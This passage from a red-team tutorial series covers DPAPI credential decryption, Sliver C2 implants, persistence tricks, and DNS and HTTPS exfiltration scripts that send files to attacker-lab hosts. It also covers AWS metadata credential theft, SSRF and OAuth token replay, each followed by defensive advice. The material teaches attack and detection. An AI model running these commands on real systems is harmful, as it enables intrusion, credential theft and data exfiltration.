opening a `PROCESS_VM_READ` handle to LSASS are the primary defensive mitigations that
break this attack chain.

---

## Example 70: Credential Access via DPAPI — Decrypting User Secrets

**What this covers:** The Windows Data Protection API (DPAPI) encrypts secrets like
browser-saved passwords, Wi-Fi keys, and RDP credentials using keys derived from the
user's password. An attacker with the user's credentials or SYSTEM access can decrypt
any DPAPI blob — including browser credential stores — without needing to crack password
hashes.

**Scenario:** Authorized red team engagement — credential harvesting from a user workstation
in a lab environment where a meterpreter session runs in the context of the logged-on user.

```bash
# DPAPI credential decryption via Mimikatz — lab workstation with user-level shell

# Step 1: Locate the user's DPAPI master key file
# => master keys live in %APPDATA%\Microsoft\Protect\<SID>\<GUID>
dir "C:\Users\jsmith\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1109\"
# => 2026-01-15  09:30    262144  a1b2c3d4-e5f6-7890-abcd-ef1234567890
# => the GUID file is the encrypted master key; needs user password or domain backup key

# Step 2: Decrypt master key using the user's logon password
mimikatz # dpapi::masterkey \
  /in:"C:\Users\jsmith\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1109\a1b2c3d4-e5f6-7890-abcd-ef1234567890" \
  /password:"Summer2024!"
# => [masterkey] with password: Summer2024! (normal user)
# =>   key : 3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a
# =>   sha1: 8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d

# Step 3: Locate credential blobs (e.g., Windows Credential Manager)
dir "C:\Users\jsmith\AppData\Local\Microsoft\Credentials\"
# => 2026-01-20  14:22     1,234  DFBE70A7E5CC19A398EBF1B96FBEE0AD
# => each file is a DPAPI-encrypted credential blob

# Step 4: Decrypt the credential blob using the decrypted master key
mimikatz # dpapi::cred \
  /in:"C:\Users\jsmith\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96FBEE0AD" \
  /masterkey:3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a
# =>  * volatile cache: GUID:{a1b2c3d4-...}; SHA1: 8a9b0c1d...
# =>  TargetName  : Domain:target=CORP\DC01
# =>  UserName    : CORP\svc_backup
# =>  CredentialBlob : BackupSvc#2024!
# =>  ^^^ plaintext password for svc_backup — direct lateral movement opportunity
```

**Key Takeaway:** DPAPI is transparent to legitimate users but becomes a treasure chest for
attackers who already have the user's password or SYSTEM access. Browser-saved passwords
(Chrome, Edge) are DPAPI-protected and trivially decryptable with tools like
`SharpChrome`. Defenders should promote password manager usage over browser storage and
monitor for `dpapi::` Mimikatz commands in command-line telemetry.

**Why It Matters:** DPAPI attacks demonstrate that credential theft extends far beyond
LSASS: every browser-saved password, every cached VPN credential, and every Windows
Credential Manager entry is an attack surface. Organizations that rely on browser
password storage as a user convenience are implicitly granting attackers access to every
site password if a workstation is compromised, underscoring the need for enterprise
password managers with centralized audit logging.

---

## Example 71: C2 Framework Basics — Sliver Listener and Agent

**What this covers:** A Command and Control (C2) framework provides an encrypted,
resilient communication channel between attacker infrastructure and compromised hosts.
Sliver is an open-source C2 framework written in Go that generates implants for Windows,
Linux, and macOS with built-in mTLS, DNS, and HTTP transport options.

**Scenario:** Authorized red team engagement — establishing a C2 channel from a lab
Windows 10 target back to a Kali Linux attacker VM on the same isolated network.

```bash
# Sliver C2 — server setup on Kali (attacker VM at 192.0.2.5)

sliver-server
# => [*] Starting gRPC server ...
# => [*] Loaded 79 extension(s)
# => Connecting to localhost:31337 ...
# =>
# => [server] sliver >

# Step 1: Start an mTLS listener on the C2 server
[server] sliver > mtls --lport 8443
# => [*] Starting mTLS listener on :8443
# => [*] Certificate saved to /root/.sliver/certs/...
# => mTLS uses mutual TLS — both sides present certificates; traffic is opaque to proxies

# Step 2: Generate an implant (agent) for Windows x64
[server] sliver > generate --mtls 192.0.2.5:8443 --os windows --arch amd64 \
  --format exe --save /tmp/beacon.exe
# => [*] Generating new windows/amd64 implant binary
# => [*] Symbol obfuscation is enabled
# => [!] Build completed in 18.742s
# => [*] Implant saved to /tmp/beacon.exe
# => symbol obfuscation randomises function names to defeat static analysis

# Step 3: Deliver beacon.exe to the target (via phishing, web delivery, etc.)
# In lab: copy via shared folder and execute on Windows VM

# Step 4: Implant checks in to C2 server
[server] sliver > sessions
# => ID         Transport  Remote Address       Hostname   Username    OS/Arch
# => 4a3f2e1d   mtls       192.0.2.20:51234  WIN10-LAB  jsmith      windows/amd64
# => new session established; all traffic is mTLS-encrypted, no plaintext

[server] sliver > use 4a3f2e1d
# => [*] Active session WIN10-LAB (4a3f2e1d)
[server] sliver (WIN10-LAB) > whoami
# => Logon User  : CORP\jsmith
# => Enable Priv : SeChangeNotifyPrivilege
```

**Key Takeaway:** Modern C2 frameworks like Sliver use mTLS, HTTP/2, or DNS transports
that blend with legitimate traffic, making network-layer detection depend on behavioral
analysis (beacon interval, JA3 fingerprints) rather than payload inspection.

**Why It Matters:** Understanding C2 framework architecture is essential for both red and
blue teams. Red teamers need reliable, covert communication channels to simulate advanced
persistent threats; blue teams need to understand how C2 traffic behaves to build
effective network detection rules. JA3/JA3S TLS fingerprinting, beacon interval analysis,
and domain categorisation are the primary network-layer controls that can expose even
well-configured C2 infrastructure.

---

## Example 72: DNS C2 Exfiltration — Data Over DNS TXT Queries

**What this covers:** DNS is rarely blocked at enterprise firewalls and is trusted by most
network monitoring tools. Encoding data in DNS query labels and retrieving it via TXT
record responses creates a covert channel that can exfiltrate data even through highly
restrictive egress filtering that blocks all TCP/UDP except DNS.

**Scenario:** Authorized red team engagement — testing data exfiltration controls in a lab
environment where all outbound traffic except DNS is blocked by firewall policy.

```python
#!/usr/bin/env python3
# dns_exfil.py — encode and exfiltrate data via DNS TXT queries (attacker-controlled domain)
# Requires: attacker controls NS for exfil.attacker-lab.example

import base64
import socket
import time

ATTACKER_DOMAIN = "exfil.attacker-lab.example"  # => attacker-controlled DNS zone
CHUNK_SIZE = 30   # => DNS label max 63 chars; base32 of 30 bytes = 48 chars (safe)

def exfil_data(data: bytes) -> None:
    # Step 1: base32-encode data (DNS-safe alphabet, no special chars)
    encoded = base64.b32encode(data).decode().rstrip("=").lower()
    # => e.g., b"secret" -> "on2he2lb"  (no uppercase, no padding issues in DNS labels)

    chunks = [encoded[i:i+CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]
    # => split into label-sized chunks to fit DNS query format

    total = len(chunks)
    for seq, chunk in enumerate(chunks):
        # Step 2: construct query — <seq>.<chunk>.<total>.<domain>
        query = f"{seq}.{chunk}.{total}.{ATTACKER_DOMAIN}"
        # => e.g., 0.on2he2lbon2he2lb.2.exfil.attacker-lab.example
        # => DNS resolver forwards query to attacker's NS; attacker logs label content

        try:
            socket.getaddrinfo(query, None)
            # => triggers DNS lookup; resolver sends query to attacker's authoritative NS
            # => attacker's NS logs the full FQDN including the encoded data chunk
        except socket.gaierror:
            pass   # => NXDOMAIN expected — data in query, not response
        # => wait between queries to avoid rate-limit detection by DNS monitoring
        time.sleep(0.5)

    # Send end-of-transmission marker
    socket.getaddrinfo(f"END.{total}.{ATTACKER_DOMAIN}", None)
    # => attacker-side: reassemble chunks by sequence number, base32-decode

# Example: exfiltrate /etc/passwd content
with open("/etc/passwd", "rb") as f:
    exfil_data(f.read())
# => DNS queries carry file content encoded in query labels
# => each query logged by attacker's authoritative DNS server
```

**Key Takeaway:** DNS exfiltration is slow (limited by query rate and label size) but
extremely reliable. Defenders should monitor for high-volume queries to a single unusual
domain, anomalous label lengths, and high-entropy subdomains using DNS RPZ (Response
Policy Zones) and DNS-layer security products.

**Why It Matters:** DNS exfiltration demonstrates why "block everything except DNS" is
not a meaningful security control. The protocol's ubiquity and trust status make it a
persistent covert channel that is difficult to eliminate without breaking legitimate
DNS functionality. Defenders must invest in DNS behavioral analytics — monitoring query
volume, entropy, and destination domain age — to detect data exfiltration before
sensitive information leaves the perimeter.

---

## Example 73: HTTPS C2 Traffic Blending — Malleable Profiles

**What this covers:** C2 traffic is detectable by its predictable beacon interval, HTTP
headers, and TLS fingerprint. Malleable C2 profiles (a Cobalt Strike concept, available
in open-source clones) customize every HTTP field — URI, headers, User-Agent, response
body padding — to mimic legitimate application traffic, defeating signature-based
network monitoring.

**Scenario:** Authorized red team engagement — testing whether network DLP and IDS
detect C2 communications blended with normal web browsing traffic in a lab environment.

```yaml
# malleable_profile.sliver — Sliver C2 HTTP profile mimicking Google Analytics traffic
# Applied with: sliver-server --config malleable_profile.sliver

http-config:
  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
  # => identical to a real Chrome 124 UA string; blends with browser traffic

  headers:
    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    # => standard Chrome Accept header — mimics organic browser request
    Accept-Language: "en-US,en;q=0.5"
    Accept-Encoding: "gzip, deflate, br"
    Connection: "keep-alive"
    # => all headers present in legitimate browser GET; missing headers are a fingerprint

implant-config:
  sleep: 60 # => beacon interval: 60 seconds (mimics GA ping frequency)
  jitter: 30 # => ±30s jitter — prevents exact-interval detection
  # => effective check-in: every 30-90 seconds, not periodic enough to flag threshold rules

  get-uri:
    - "/analytics.js" # => legitimate-looking path; Google Analytics JS file name
    - "/collect?v=1&tid=UA-12345" # => mimics GA hit collection endpoint
    # => IDS rules matching exact GA URI would generate false positives on real traffic

  post-uri:
    - "/j/collect" # => GA batch collection endpoint
    # => POST body carries encrypted C2 tasking; padded to match real GA payload sizes

  response-body:
    prepend: "GIF89a\x01\x00\x01\x00\x00\xff\x00,"
    # => prepend GIF magic bytes — response looks like a 1x1 tracking pixel
    # => actual C2 data follows after the fake GIF header; parser skips header
    append: "\x00\x3b" # => GIF trailer — closes the fake GIF container
```

```bash
# Verify TLS fingerprint blending (JA3 hash should match Chrome)
curl -v --tlsv1.3 https://c2.attacker-lab.example/analytics.js 2>&1 | grep 'TLS'
# => * TLSv1.3 (OUT), TLS handshake, Client hello (1):
# JA3 fingerprint controlled by implant's TLS library configuration
# => targeting ja3: "771,4865-4866-4867-...,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,..."
# => matches real Chrome JA3 — network sensors cannot distinguish from browser TLS
```

**Key Takeaway:** Malleable profiles shift C2 detection from pattern-matching to behavioral
analytics — requiring defenders to correlate beacon intervals, payload sizes, and
certificate metadata rather than relying on known-bad URI signatures.

**Why It Matters:** Traffic blending represents the maturation of offensive C2 tradecraft:
attackers no longer use predictable beaconing that any basic IDS can catch. Defenders
must move toward full-packet inspection with machine-learning-based anomaly detection,
focusing on statistical properties of the traffic stream (entropy, inter-arrival times,
payload size distributions) rather than string signatures, which is a fundamentally more
expensive and complex detection capability to maintain.

---

## Example 74: Persistence via Registry Run Key

**What this covers:** The Windows registry Run key causes a specified executable to launch
automatically at user logon or system startup. It is one of the most common persistence
mechanisms because it requires only standard registry write permissions in the
`HKCU` (current user) hive and survives reboots without requiring administrator rights.

**Scenario:** Authorized red team engagement — establishing persistence on a Windows 10
lab host after initial access as a standard domain user.

```powershell
# Registry Run key persistence — HKCU (no admin required) and HKLM (admin required)

# Step 1: HKCU Run key — persists for current user's logon sessions only
$payload = "C:\Users\jsmith\AppData\Roaming\updater.exe"
# => payload path: hidden in AppData to avoid casual inspection
# => updater.exe is our C2 implant, renamed to look like a legitimate updater

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" `
  /v "WindowsUpdater" `
  /t REG_SZ `
  /d "$payload" `
  /f
# => /v "WindowsUpdater" — value name; choose something plausible like "OneDriveSync"
# => /t REG_SZ           — string value type
# => /d "$payload"       — data: full path to implant
# => /f                  — force overwrite without prompt
# => on next logon: Windows runs updater.exe before the desktop appears

# Verify the key was written
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
# => HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
# =>     WindowsUpdater    REG_SZ    C:\Users\jsmith\AppData\Roaming\updater.exe
# =>     OneDrive          REG_SZ    "C:\Program Files\Microsoft OneDrive\OneDrive.exe"
# => our key blends with legitimate entries like OneDrive

# Step 2: HKLM Run key — all users, requires local admin
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" `
  /v "SystemHealthCheck" `
  /t REG_SZ `
  /d "C:\Windows\System32\svccheck.exe" `
  /f
# => /v "SystemHealthCheck" — plausible system-sounding name
# => HKLM key fires for every user who logs on — broader persistence reach

# Sysmon detection: Event ID 13 (RegistryValueSet) on Run key paths
# => Sysmon rule: TargetObject contains "CurrentVersion\Run" — high-fidelity alert
```

**Key Takeaway:** Registry Run key persistence is trivially detectable by Sysmon event 13
and Autoruns (Sysinternals), making it suitable for testing basic detection coverage but
unlikely to survive a mature SOC. Attackers often use it as a quick fallback while
deploying stealthier WMI or scheduled task persistence in parallel.

**Why It Matters:** Despite being well-known, registry Run key persistence remains
prevalent in malware because it is reliable, requires minimal privileges, and is often
overlooked in environments that lack Sysmon or centralized registry auditing. Baselining
the Run key contents with Autoruns and alerting on any new entry is a high-signal,
low-effort defensive control that catches a significant portion of commodity malware
persistence attempts.

---

## Example 75: Persistence via Scheduled Task

**What this covers:** Windows Task Scheduler allows users and administrators to run
executables on a defined schedule or trigger event. Scheduled tasks can be configured
to run as SYSTEM, survive reboots, and be hidden from the Task Scheduler GUI, making
them a popular persistence mechanism for advanced adversaries.

**Scenario:** Authorized red team engagement — establishing system-level persistence on a
Windows Server 2022 lab host after achieving local administrator access.

```powershell
# Scheduled task persistence — hidden, SYSTEM-level, surviving reboots

# Step 1: Create a scheduled task that runs our payload as SYSTEM at logon
schtasks /create `
  /tn "\Microsoft\Windows\Maintenance\WinSATAssessment" `
  /tr "C:\Windows\System32\svchost_custom.exe" `
  /sc ONLOGON `
  /ru SYSTEM `
  /rl HIGHEST `
  /f
# => /tn  — task name; nested under \Microsoft\Windows\Maintenance\ for camouflage
# => /tr  — task run: path to payload; named to resemble system binary
# => /sc ONLOGON — trigger: runs whenever any user logs on
# => /ru SYSTEM  — run as: NT AUTHORITY\SYSTEM (highest local privilege)
# => /rl HIGHEST — highest available run level
# => /f          — force create (overwrite if exists)

# Step 2: Verify task creation
schtasks /query /tn "\Microsoft\Windows\Maintenance\WinSATAssessment" /v /fo LIST
# => TaskName:   \Microsoft\Windows\Maintenance\WinSATAssessment
# => Status:     Ready
# => Run As User: SYSTEM
# => Task To Run: C:\Windows\System32\svchost_custom.exe
# => Schedule:    At log on of any user

# Step 3: Hide task from GUI (requires registry manipulation as SYSTEM)
# Task XML stored at: C:\Windows\System32\Tasks\Microsoft\Windows\Maintenance\WinSATAssessment
# Set SD (Security Descriptor) to deny read access to normal users
# => from attacker perspective: Task Scheduler UI shows "Access Denied" for this task
# => administrators using schtasks /query still see it — partial concealment only

# Step 4: Trigger manually to verify execution
schtasks /run /tn "\Microsoft\Windows\Maintenance\WinSATAssessment"
# => SUCCESS: The scheduled task "...\WinSATAssessment" has been successfully run.

# Detection: Windows event 4698 (task created) + Sysmon event 1 (process create from task host)
# => taskeng.exe or svchost spawning unexpected child process is high-fidelity alert
```

**Key Takeaway:** Scheduled tasks run as SYSTEM without any logged-on user session,
providing persistence that survives reboots and works even on server systems where no
user ever interactively logs on. Defenders should audit task creation events (4698/4702)
and baseline scheduled tasks using `schtasks /query /fo CSV` exports.

**Why It Matters:** Scheduled task persistence is harder to detect than Run keys because
tasks can be placed in system-looking paths and named to mimic legitimate Windows
maintenance tasks. Many organizations lack scheduled task auditing policies, making this
a reliable long-term persistence mechanism. Comprehensive detection requires correlating
task creation events with the task binary's file reputation and code-signing status — an
approach that catches novel payloads that no signature database recognizes.

---

## Example 76: Persistence via WMI Subscription

**What this covers:** Windows Management Instrumentation (WMI) event subscriptions
allow code to execute in response to system events (process creation, user logon, time
triggers) without creating visible scheduled tasks or registry keys. WMI persistence
survives reboots, runs as SYSTEM, and is invisible to most user-facing management tools.

**Scenario:** Authorized red team engagement — establishing stealthy persistence on a
Windows 10 lab host, testing whether the target's EDR detects WMI-based backdoors.

```powershell
# WMI event subscription persistence — event filter + consumer + binding

# Step 1: Create a WMI event filter — triggers every 60 minutes
$wmiFilter = Set-WmiInstance -Namespace root\subscription `
  -Class __EventFilter `
  -Arguments @{
    Name           = "SystemHealthMonitor"
    # => innocuous-sounding name to blend with legitimate WMI consumers
    EventNamespace = "root\cimv2"
    QueryLanguage  = "WQL"
    Query          = "SELECT * FROM __TimerEvent WHERE TimerID = 'SysHealthTimer'"
    # => WQL query: fires when a named timer event occurs
  }
# => $wmiFilter: WMI __EventFilter instance; does not execute payload yet

# Step 2: Create an interval timer (fires every 3600 seconds)
Set-WmiInstance -Namespace root\subscription `
  -Class __IntervalTimerInstruction `
  -Arguments @{
    TimerID         = "SysHealthTimer"   # => matches filter's TimerID
    IntervalBetweenEvents = 3600000      # => milliseconds = 60 minutes
  }
# => timer fires every 60 min, which triggers the event filter above

# Step 3: Create a WMI consumer — what to run when filter fires
$wmiConsumer = Set-WmiInstance -Namespace root\subscription `
  -Class CommandLineEventConsumer `
  -Arguments @{
    Name             = "SystemHealthExecutor"
    CommandLineTemplate = "C:\Windows\System32\cmd.exe /c C:\Windows\Temp\payload.bat"
    # => cmd.exe runs payload.bat when the timer fires
    # => payload.bat re-checks C2 connectivity and relaunches implant if needed
  }
# => $wmiConsumer: CommandLineEventConsumer instance

# Step 4: Bind filter to consumer — activates the subscription
Set-WmiInstance -Namespace root\subscription `
  -Class __FilterToConsumerBinding `
  -Arguments @{
    Filter   = $wmiFilter
    Consumer = $wmiConsumer
  }
# => subscription is now active; WMI service runs payload every 60 minutes as SYSTEM
# => persists across reboots — stored in WMI repository (C:\Windows\System32\wbem\Repository)

# Detection: Sysmon event 20 (WmiEventFilter), 21 (WmiEventConsumer), 22 (WmiBindingCreated)
# => correlate all three event IDs to reconstruct full subscription — alert on CommandLine consumer
```

**Key Takeaway:** WMI subscriptions are stored in the binary WMI repository, not in the
registry or filesystem, making them invisible to Autoruns unless the WMI-specific scanning
option is enabled. Sysmon events 20-22 provide high-fidelity detection when correlated.

**Why It Matters:** WMI persistence represents adversary tradecraft designed specifically
to evade the most common detection controls. Because no scheduled task or registry entry
is created, defenders relying solely on Autoruns or Run-key monitoring will miss this
persistence mechanism entirely. This example motivates the need for comprehensive Windows
event log coverage including WMI operational logs, and illustrates why defense-in-depth
across multiple telemetry sources is essential for detecting sophisticated adversaries.

---

## Example 77: Data Staging and Exfiltration

**What this covers:** Before exfiltrating data, attackers stage it — compressing and
encrypting it into a single archive to reduce transfer time, bypass content inspection,
and avoid partial-file detection. The staged archive is then uploaded to attacker
infrastructure using protocol-camouflaged HTTP(S) requests.

**Scenario:** Authorized red team engagement — simulating data theft of sensitive documents
from a Windows file server in a lab environment, testing DLP controls.

```powershell
# Data staging and exfiltration — 7-Zip archive + password-protected upload

# Step 1: Identify high-value data on the compromised server
Get-ChildItem -Path "\\FILESRV01\Finance$\" -Recurse -Include "*.xlsx","*.pdf","*.docx" |
  Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-90) }
# => filters for recent finance documents — prioritise fresh, valuable data
# => output: list of file paths and sizes for staging decision

# Step 2: Stage compressed, encrypted archive (7-Zip password protects from content inspection)
$stagePath = "C:\Windows\Temp\stage\"
New-Item -ItemType Directory -Path $stagePath -Force | Out-Null
# => stage directory in Windows\Temp — less scrutinised than user dirs

.\7za.exe a -tzip -p"EngagementKey2024!" `
  "$stagePath\data.zip" `
  "\\FILESRV01\Finance$\FY2024\*" `
  -r -mx=9
# => a       — add files to archive
# => -tzip   — ZIP format (common, less suspicious than 7z for network inspection)
# => -p      — password-protect with AES-256; content opaque to DLP without password
# => -mx=9   — maximum compression to reduce transfer size
# => -r      — recurse subdirectories

# Step 3: Verify archive integrity before exfil
.\7za.exe l "$stagePath\data.zip" | Select-String "Files:"
# =>   432 files                  — confirms all files staged
# =>   Size: 187,432,211          — ~179 MB before compression
# =>   Compressed: 24,891,334     — ~24 MB after (87% reduction)

# Step 4: Exfiltrate via HTTPS to attacker web server (blends with normal HTTPS traffic)
$uploadUri = "https://file-share.attacker-lab.example/upload/$(New-Guid)"
# => unique GUID in URI — makes each exfil URL different to defeat exact-match rules

Invoke-WebRequest -Uri $uploadUri `
  -Method POST `
  -InFile "$stagePath\data.zip" `
  -ContentType "application/octet-stream" `
  -Headers @{ "X-Upload-Token" = "engmnt-2024" }
# => streams archive to attacker server; POST body is encrypted ZIP (DLP cannot inspect)
# => StatusCode 200 — upload complete

Remove-Item -Path $stagePath -Recurse -Force   # => cleanup staging directory
# => removes forensic evidence of staged archive from disk
```

**Key Takeaway:** Password-encrypted archives defeat most inline DLP content inspection.
Defenders should monitor for large outbound HTTPS POST requests (>10 MB) to uncategorized
domains, especially from servers that normally do not initiate outbound connections.

**Why It Matters:** Data staging and exfiltration is the final objective in most targeted
attacks and the clearest measure of business impact. Defenders must implement egress
filtering beyond simple port blocking, including DLP policies that flag large outbound
transfers, network behavioral analytics that detect unusual server-originated outbound
HTTPS, and data classification systems that alert when sensitive files are accessed in
bulk — the only reliable way to detect staging before exfiltration completes.

---

## Example 78: Cloud Credential Theft — AWS IMDS Credentials

**What this covers:** AWS EC2 instances can be assigned IAM roles. The Instance Metadata
Service (IMDS) exposes temporary credentials for that role at a link-local address
accessible only from within the instance. Malware running on a compromised EC2 instance
can steal these credentials and use them from any internet-connected machine to access
AWS resources with the role's permissions.

**Scenario:** Authorized red team engagement — demonstrating cloud credential theft from
a compromised EC2 instance in a lab AWS account after gaining shell access via a web
application vulnerability.

```bash
# AWS IMDS credential theft — from inside a compromised EC2 instance (lab account)

# Step 1: Confirm instance is AWS and has an associated IAM role
curl -s http://169.254.169.254/latest/meta-data/
# => ami-id
# => instance-type
# => iam/                   ← IAM section present = role is attached
# => local-ipv4

# Step 2: Retrieve the attached IAM role name
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
echo $ROLE_NAME
# => EC2-WebApp-Role        ← name of the IAM role attached to this instance

# Step 3: Fetch temporary credentials from IMDS
CREDS=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME")
echo $CREDS
# => {
# =>   "Code"            : "Success",
# =>   "Type"            : "AWS-HMAC",
# =>   "AccessKeyId"     : "ASIA3EXAMPLE123456AB",   ← temporary key (ASIA prefix = STS)
# =>   "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
# =>   "Token"           : "AQoXnyc4lcK4w...(long STS session token)...",
# =>   "Expiration"      : "2026-05-21T14:30:00Z"    ← valid for ~6 hours
# => }

# Step 4: Export credentials and use from attacker machine (outside AWS)
export AWS_ACCESS_KEY_ID="ASIA3EXAMPLE123456AB"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="AQoXnyc4lcK4w..."

# Enumerate accessible S3 buckets using the stolen role credentials
aws s3 ls
# => 2026-01-10 09:15:23 corp-finance-reports   ← sensitive bucket accessible with this role
# => 2026-02-15 14:22:07 corp-customer-data
# => 2026-03-01 11:30:45 corp-backups

# Download sensitive data
aws s3 sync s3://corp-finance-reports /tmp/stolen-data/
# => download: s3://corp-finance-reports/FY2024-Q4.xlsx to /tmp/stolen-data/FY2024-Q4.xlsx
```

**Key Takeaway:** IMDS credential theft demonstrates that a compromised EC2 instance
grants the attacker all AWS permissions of the attached IAM role — potentially including
read access to S3, EC2 API calls, or even IAM privilege escalation. AWS IMDSv2 (requiring
PUT before GET) significantly reduces the attack surface for SSRF-based IMDS access.

**Why It Matters:** Cloud environments introduce a new credential surface that has no
on-premises analogue: instance metadata services that vend powerful API credentials to
any code running on the instance. Organizations must enforce IMDSv2, apply least-privilege
IAM roles, monitor CloudTrail for `AssumeRole` and API calls from unexpected source IPs,
and use AWS GuardDuty's anomaly detection to catch credential use from outside the
expected instance network — all essential cloud-native defensive controls.

---

## Example 79: SSRF to Metadata Service

**What this covers:** Server-Side Request Forgery (SSRF) tricks a web application into
making HTTP requests to internal resources. When the target is a cloud VM, SSRF can reach
the Instance Metadata Service at `169.254.169.254`, leaking IAM credentials without
requiring any OS-level access to the instance.

**Scenario:** Authorized web application penetration test — testing SSRF mitigations on
a lab AWS EC2 instance running a URL-fetching web service.

```bash
# SSRF to IMDS — exploiting a vulnerable URL-fetcher endpoint (lab)

# Vulnerable endpoint: POST /fetch with JSON body {"url": "<attacker-controlled>"}
# Normal usage: user supplies a URL; server fetches and returns the response

# Step 1: Confirm basic SSRF by fetching an internal resource
curl -s -X POST https://webapp.lab.example/fetch \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
# => ami-id
# => hostname
# => iam/                   ← server fetched IMDS and returned it — SSRF confirmed
# => instance-id
# => local-hostname

# Step 2: Pivot SSRF to extract IAM role name
curl -s -X POST https://webapp.lab.example/fetch \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# => WebApp-EC2-Role        ← role name returned through the SSRF

# Step 3: Extract temporary IAM credentials via SSRF
curl -s -X POST https://webapp.lab.example/fetch \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/WebApp-EC2-Role"}'
# => {"Code":"Success","Type":"AWS-HMAC",
# =>  "AccessKeyId":"ASIA3SSRFEXAMPLE78CD",
# =>  "SecretAccessKey":"SSRFsecretKEY/exampleSecretABCDEFGH",
# =>  "Token":"AQoXssrf...",
# =>  "Expiration":"2026-05-21T18:00:00Z"}
# => full IAM credentials returned — attacker can now use them from any machine

# Step 4: Validate credentials from attacker machine
AWS_ACCESS_KEY_ID=ASIA3SSRFEXAMPLE78CD \
AWS_SECRET_ACCESS_KEY="SSRFsecretKEY/exampleSecretABCDEFGH" \
AWS_SESSION_TOKEN="AQoXssrf..." \
aws sts get-caller-identity
# => { "UserId": "AROA3SSRF:i-0abc123def456789",
# =>   "Account": "123456789012",
# =>   "Arn": "arn:aws:sts::123456789012:assumed-role/WebApp-EC2-Role/i-0abc123def456789" }
# => credentials valid; attacker has full WebApp-EC2-Role permissions
```

**Key Takeaway:** SSRF to the metadata service is exploitable without any OS access to
the instance — a pure application-layer vulnerability that yields cloud-level credentials.
Enabling IMDSv2 (PUT-then-GET token flow) blocks all SSRF-based IMDS access because
SSRF requests cannot follow the two-step PUT protocol.

**Why It Matters:** The combination of SSRF and cloud metadata services has been the root
cause of several high-profile cloud breaches. This single vulnerability class can escalate
a web application bug into a full cloud account compromise if the EC2 role has broad
permissions. The fix is dual-layered: enforce IMDSv2 at the instance level and implement
server-side URL allowlists that reject requests to link-local (169.254.0.0/16) and
private IP ranges in the application code.

---

## Example 80: OAuth 2.0 Token Theft — Intercepting and Replaying a Bearer Token

**What this covers:** OAuth 2.0 bearer tokens grant access to protected resources without
re-authentication. If a token is intercepted (via MitM, log leakage, or XSS), any party
in possession of it can replay it from any IP address until it expires, because bearer
tokens are credential-equivalent secrets that carry no binding to the original requester.

**Scenario:** Authorized penetration test — demonstrating OAuth token theft in a lab
environment with a misconfigured authorization server that logs full tokens in access logs.

```bash
# OAuth bearer token theft and replay — lab demo with a local OAuth server

# Step 1: Intercept a bearer token from application logs (misconfiguration: token in URL)
# Victim's browser request: GET /api/data?access_token=eyJhbGciOiJSUzI1NiJ9.eyJzdW...
# => tokens in URL end up in: web server access logs, browser history, Referer headers
# => this is a known OAuth anti-pattern; tokens must be in Authorization header only

grep "access_token=" /var/log/nginx/access.log | tail -1
# => 192.0.2.50 - - [21/May/2026:10:30:01] "GET /api/data?access_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyIsInNjb3BlIjoiZmluYW5jZTpyZWFkIGFkbWluOndyaXRlIiwiZXhwIjoxNzE2MzQ4NjAwfQ.SIG HTTP/1.1" 200
# => token extracted from log: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...

TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyIsInNjb3BlIjoiZmluYW5jZTpyZWFkIGFkbWluOndyaXRlIiwiZXhwIjoxNzE2MzQ4NjAwfQ.SIG"

# Step 2: Decode JWT payload to understand token scope (no signature verification needed)
echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
# => {
# =>   "sub":   "user_123",                        ← victim's user ID
# =>   "scope": "finance:read admin:write",         ← has admin:write — high privilege
# =>   "exp":   1716348600                          ← expiry: Unix timestamp
# => }
# => token grants finance read AND admin write — lateral movement via API possible

# Step 3: Replay the stolen token from attacker machine (different IP)
curl -s -H "Authorization: Bearer $TOKEN" \
  https://api.lab.example/v1/admin/users
# => [{"id":"user_001","email":"ceo@corp.example","role":"admin"},
# =>   {"id":"user_002","email":"cfo@corp.example","role":"admin"}, ...]
# => token accepted — no IP binding, no reuse detection; full admin API access
```

**Key Takeaway:** Bearer tokens are as powerful as passwords but frequently mishandled —
logged in plain text, passed in URLs, and stored in browser localStorage without
expiration enforcement. Defenders should enforce short token lifetimes (<15 minutes),
implement token binding (DPoP), and never log Authorization headers.

**Why It Matters:** OAuth token theft is a prevalent but underestimated attack vector
because tokens look like opaque strings rather than credentials. A stolen bearer token
with `admin:write` scope is functionally equivalent to admin credentials but often
bypasses account-level controls like MFA and IP-based session validation. Organizations
must treat tokens as secrets: rotate frequently, enforce scopes narrowly, use DPoP binding
